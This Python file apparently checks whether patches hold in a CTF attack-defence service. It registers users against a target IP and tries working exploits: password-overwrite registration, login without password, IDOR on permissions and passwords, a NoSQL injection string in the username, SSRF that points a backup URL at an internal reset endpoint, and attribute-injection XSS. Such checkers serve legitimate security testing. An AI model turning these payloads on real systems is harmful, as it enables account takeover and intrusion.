import requests
import time
import base64

from requests.adapters import HTTPAdapter, Response
from dotenv import dotenv_values
from user_agent import generate_user_agent
from bs4 import BeautifulSoup as BS

from lib.api import *
from lib.utils import *
from lib.fuzzer import Fuzzer
from lib.schema import endpoints

from seleniumwire import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.wait import WebDriverWait
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.common.by import By

chrome_options = Options()
chrome_options.add_argument("--headless")
chrome_options.add_argument("--no-sandbox")
chrome_options.add_argument('--disable-dev-shm-usage')
chrome_options.add_argument('--disable-gpu')
prefs = {'profile.default_content_setting_values': {'cookies': 2, 'images': 2, 'javascript': 2,
                                                    'plugins': 2, 'popups': 2, 'geolocation': 2,
                                                    'notifications': 2, 'auto_select_certificate': 2, 'fullscreen': 2,
                                                    'mouselock': 2, 'mixed_script': 2, 'media_stream': 2,
                                                    'media_stream_mic': 2, 'media_stream_camera': 2, 'protocol_handlers': 2,
                                                    'ppapi_broker': 2, 'automatic_downloads': 2, 'midi_sysex': 2,
                                                    'push_messaging': 2, 'ssl_cert_decisions': 2, 'metro_switch_to_desktop': 2,
                                                    'protected_media_identifier': 2, 'app_banner': 2, 'site_engagement': 2,
                                                    'durable_storage': 2}}
chrome_options.add_experimental_option('prefs', prefs)
chrome_options.add_argument("start-maximized")
chrome_options.add_argument("disable-infobars")
chrome_options.add_argument("--disable-extensions")


def document_initialised(driver):
    return driver.execute_script("return document.querySelector('#email-input')")


VULN_NOT_FIXED = 'NOT FIXED'
VULN_FIXED = 'FIXED'

config = dotenv_values('env')
PORT = int(config.get('XSS_PORT', 8080))
ADMIN_LOGIN = config.get('XSS_ADMIN_LOGIN')
ADMIN_PASS = config.get('XSS_ADMIN_PASS')
BASIC_LOGIN = config.get('XSS_BASIC_LOGIN')
BASIC_PASS = config.get('XSS_BASIC_PASS')

BASIC = base64.b64encode(f'{BASIC_LOGIN}:{BASIC_PASS}'.encode()).decode()

MAX_MUTATIONS = 4


def exc_check(f):
    def wrapper(*args, **kwargs):
        try:
            return f(*args, **kwargs)
        except ApiException as e:
            return e.status, e.trace, e.description
        except Exception as e:
            return STATUS_DOWN, 'Exploit run failed', str(e)

    return wrapper


timeout = 3


class TimeoutHTTPAdapter(HTTPAdapter):
    def send(self, *args, **kwargs) -> Response:
        kwargs['timeout'] = timeout
        return super().send(*args, **kwargs)


def selenium_headers(request):
    if 'Authorization' in request.headers:
        del request.headers['Authorization']
    request.headers['Authorization'] = f'Basic {BASIC}'


def fixed(vuln_name):
    return VULN_FIXED, f'{vuln_name} was fixed', ''


def not_fixed(vuln_name):
    return VULN_NOT_FIXED, f'{vuln_name} still works', ''


class Vulns:
    def __init__(self, ip):
        self.session = requests.Session()
        self.session.mount('https://', TimeoutHTTPAdapter(max_retries=2))
        self.session.mount('http://', TimeoutHTTPAdapter(max_retries=2))
        self.session.verify = False

        self.session_admin = requests.Session()
        self.session_admin.mount('https://', TimeoutHTTPAdapter(max_retries=2))
        self.session_admin.mount('http://', TimeoutHTTPAdapter(max_retries=2))
        self.session_admin.verify = False

        self.session.auth = (BASIC_LOGIN, BASIC_PASS)
        self.session_admin.auth = (BASIC_LOGIN, BASIC_PASS)

        self.url = f'http://{ip}:{PORT}'

        self.url_auth = self.url
        self.fuzzer = Fuzzer(self.session, self.url, endpoints, 'payloads')

    def mutate(self, n=MAX_MUTATIONS, blacklist=[], reset_session=False):
        if reset_session:
            self.fuzzer.session.cookies.clear()
        for _ in range(random.randint(1, MAX_MUTATIONS)):
            self.fuzzer.session.headers['User-Agent'] = generate_user_agent()
            self.fuzzer.fuzz_random(any_method=True, any_params=True, params_limit=4, blacklist=blacklist)

    @exc_check
    def register_rewrite(self):
        self.mutate()

        username = generate_str()
        password = generate_extended_str()
        email = generate_email()

        register(self.session, self.url, username, email, password, password)
        try:
            login(self.session, self.url, username, password)
        except KeyError:
            raise ApiException(STATUS_CORRUPT, 'Cannot get user id from login', '')

        self.mutate()

        try:
            register(self.session, self.url, username, email, '', '')
            self.mutate()
        except ApiException as e:
            if e.status == STATUS_MUMBLE:
                return fixed('register_rewrite')
            raise e
        try:
            login(self.session, self.url, username, password)
        except ApiException as e:
            if e.description != '403':
                raise e
        self.mutate()
        return not_fixed('register_rewrite')

    @exc_check
    def login_without_password(self):
        self.mutate()

        username = generate_str()
        password = generate_extended_str()
        email = generate_email()
        register(self.session, self.url, username, email, password, password)
        self.mutate()
        try:
            user_id = login_without_password(self.session, self.url, username).json()['user_id']
        except ApiException as e:
            if e.status == STATUS_MUMBLE:
                return fixed('login_without_password')
            raise e
        except KeyError:
            return fixed('login_without_password')

        return not_fixed('login_without_password')

    @exc_check
    def set_permissions_idor(self):
        self.mutate()

        username1 = generate_str()
        password1 = generate_extended_str()
        email1 = generate_email()
        register(self.session, self.url, username1, email1, password1, password1)
        self.mutate()
        user_id1 = login(self.session, self.url, username1, password1).json()['user_id']

        permissions1 = import_permissions(get_my_permissions(self.session, self.url).json()['permissions'])
        permissions2 = random_permissions(permissions_template.copy())

        self.mutate()
        try:
            set_permissions(self.session, self.url, user_id1, export_permissions(permissions2))
        except ApiException as e:
            if e.status == STATUS_MUMBLE:
                return fixed('set_permissions_idor')
            raise e

        self.mutate()
        permissions2_ = import_permissions(get_my_permissions(self.session, self.url).json()['permissions'])
        if permissions2_ != permissions2 and permissions2_ == permissions1:
            return fixed('set_permissions_idor')

        return not_fixed('set_permissions_idor')

    @exc_check
    def change_password_idor(self):
        self.mutate()

        username1 = generate_str()
        password1 = generate_extended_str()
        email1 = generate_email()
        register(self.session, self.url, username1, email1, password1, password1)
        user_id1 = login(self.session, self.url, username1, password1).json()['user_id']
        self.mutate()

        username2 = generate_str()
        password2 = generate_extended_str()
        email2 = generate_email()
        register(self.session, self.url, username2, email2, password2, password2)

        self.mutate()

        user_id2 = login(self.session, self.url, username2, password2).json()['user_id']
        self.mutate()
        try:
            change_password_exploit(self.session, self.url, user_id2, password2, user_id1, password2)

            self.mutate()

            user_id1_ = login(self.session, self.url, username1, password2).json()['user_id']
        except ApiException as e:
            if e.status == STATUS_MUMBLE:
                return fixed('change_password_idor')
            raise e
        except KeyError:
            return fixed('change_password_idor')

        if user_id1_ != user_id1:
            return fixed('change_password_idor')

        return not_fixed('change_password_idor')

    @exc_check
    def write_on_read(self):
        self.mutate()
        username = generate_str()
        password = generate_extended_str()
        email = generate_email()
        register(self.session, self.url, username, email, password, password)
        user_id = login(self.session, self.url, username, password).json()['user_id']
        self.mutate()

        element_path = 'Head office.Elevator'
        method = 'disable()'
        method_check = 'get_enabled()'

        permissions = export_permissions(
            apply_permission(none_permissions(permissions_template.copy()), element_path, Permissions.READ | Permissions.NONE))
        login(self.session_admin, self.url, ADMIN_LOGIN, ADMIN_PASS)

        self.mutate()
        set_permissions(self.session_admin, self.url, user_id, permissions)

        self.mutate()

        try:
            _ = execute_element(self.session, self.url, element_path, method, []).json()['result']
            result = execute_element(self.session, self.url, element_path, method_check, []).json()['result']
        except ApiException as e:
            if e.status == STATUS_MUMBLE:
                return fixed('write_on_read')
            raise e
        except KeyError:
            return fixed('write_on_read')

        if result == True:
            return fixed('write_on_read')

        reset_state(self.session_admin, self.url)

        return not_fixed('write_on_read')

    @exc_check
    def nosql_injection(self):
        self.mutate()

        username = generate_str()
        password = generate_extended_str()
        email = generate_email()
        register(self.session, self.url, username, email, password, password)
        user_id = login(self.session, self.url, username, password).json()['user_id']
        self.mutate()

        try:
            user_id1 = login(self.session, self.url, f"{username}' || this.username=='{username}", password).json()['user_id']
        except ApiException as e:
            if e.status == STATUS_MUMBLE:
                return fixed('nosql_injection')
            raise e
        except KeyError:
            return fixed('nosql_injection')

        if user_id != user_id1:
            return fixed('nosql_injection')

        return not_fixed('nosql_injection')

    @exc_check
    def ssrf_reset_state(self):
        self.mutate()

        login(self.session_admin, self.url, ADMIN_LOGIN, ADMIN_PASS)
        self.mutate()
        username = generate_str()
        password = generate_extended_str()
        email = generate_email()
        register(self.session, self.url, username, email, password, password)
        user_id = login(self.session, self.url, username, password).json()['user_id']
        self.mutate()

        execute_element(self.session_admin, self.url, 'Elevator', 'disable()', [])
        result = execute_element(self.session_admin, self.url, 'Elevator', 'get_enabled()', []).json()['result']
        if result != False:
            raise ApiException(STATUS_CORRUPT, 'Cannot change elements state', '')

        permissions = apply_permission(none_permissions(permissions_template.copy()), 'ServerRoom',
                                       Permissions.WRITE | Permissions.READ | Permissions.NONE)
        permissions = export_permissions(permissions)

        set_permissions(self.session_admin, self.url, user_id, permissions)
        self.mutate()

        execute_element(self.session, self.url, 'ServerRoom', 'set_backup_url(url)', ['http://127.0.0.1:8888/reset_state'])

        self.mutate()

        try:
            execute_element(self.session, self.url, 'ServerRoom', 'send_backup()', [])
        except ApiException as e:
            print(e)
            if e.status == STATUS_MUMBLE:
                return fixed('ssrf_reset_state')
            raise e
        result = execute_element(self.session_admin, self.url, 'Elevator', 'get_enabled()', []).json()['result']
        if result == False:
            return fixed('ssrf_reset_state')

        return not_fixed('ssrf_reset_state')

    @exc_check
    def xss(self):
        self.mutate()
        mark1 = generate_str()
        username = generate_str() + f'" placeholder="{mark1}" ><' + generate_str()
        email = generate_email()
        password = generate_extended_str()
        try:
            register(self.session, self.url, username, email, password, password)
            user_id = login(self.session, self.url, username, password).json()['user_id']
        except ApiException as e:
            if e.status == STATUS_MUMBLE:
                return fixed('xss')
            raise e
        except KeyError:
            return fixed('xss')
        self.mutate()
        login(self.session_admin, self.url, ADMIN_LOGIN, ADMIN_PASS)
        self.mutate()

        cookie = self.session_admin.cookies.get_dict()

        driver = webdriver.Chrome(options=chrome_options)
        driver.request_interceptor = selenium_headers
        driver.get(self.url_auth + '/')
        driver.add_cookie({"name": 'session', "value": cookie['session']})
        driver.get(self.url_auth + f'/admin/user/{user_id}')
        try:
            WebDriverWait(driver, timeout=5).until(lambda d: d.find_element(By.ID, 'email-input'))
        except TimeoutException:
            return fixed('xss')
        html = driver.page_source.encode("utf-8")
        driver.close()
        b = BS(html, 'lxml')
        results = b.findAll('input', {'placeholder': mark1})

        if not results:
            return fixed('xss')

        return not_fixed('xss')
